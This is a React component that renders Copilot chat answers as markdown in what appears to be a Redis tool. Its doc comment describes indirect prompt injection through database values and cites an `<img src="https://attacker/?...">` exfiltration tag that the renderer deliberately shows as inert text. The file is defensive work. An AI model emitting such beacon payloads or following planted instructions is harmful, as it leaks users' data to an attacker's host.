import React, { useCallback, useEffect } from 'react'
import { CloudLink } from 'uiSrc/components/markdown'
import { MarkdownRenderer } from 'uiSrc/components/markdown/MarkdownRenderer'
import { AdditionalRedisModule } from 'apiClient'
import { ChatExternalLink, CodeBlock } from './components'

// Matches the leaf shape MarkdownRenderer passes for its `RedisCode`/
// `CodeBlock` nodes; `label`/`params`/`path` are part of that shape too but
// unused here, since Copilot chat only needs the code text and its language.
export interface CodeProps {
  children: string
  lang?: string
}

export interface Props {
  onRunCommand?: (query: string) => void
  modules?: AdditionalRedisModule[]
  children: string
  onMessageRendered?: () => void
}

/**
 * Copilot answers are plain markdown (text, tables, code, links) that may be
 * influenced by untrusted data (e.g. indirect prompt injection via values
 * stored in the database). MarkdownRenderer never parses raw HTML into live
 * elements (no rehype-raw), so tags like `<img src="https://attacker/?...">`
 * render as literal text instead of firing an outbound request. See
 * RED-194228 / VDP-4596.
 */
const MarkdownMessage = (props: Props) => {
  const { modules, children, onMessageRendered, onRunCommand } = props

  const ChatCodeBlock = useCallback(
    ({ lang, children: code }: CodeProps) => (
      <CodeBlock lang={lang} modules={modules} onRunCommand={onRunCommand}>
        {code}
      </CodeBlock>
    ),
    [modules, onRunCommand],
  )

  useEffect(() => {
    onMessageRendered?.()
  }, [children])

  return (
    <MarkdownRenderer
      components={{
        RedisCode: ChatCodeBlock,
        CodeBlock: ChatCodeBlock,
        CloudLink,
        ExternalLink: ChatExternalLink,
      }}
    >
      {children}
    </MarkdownRenderer>
  )
}

export default React.memo(MarkdownMessage)
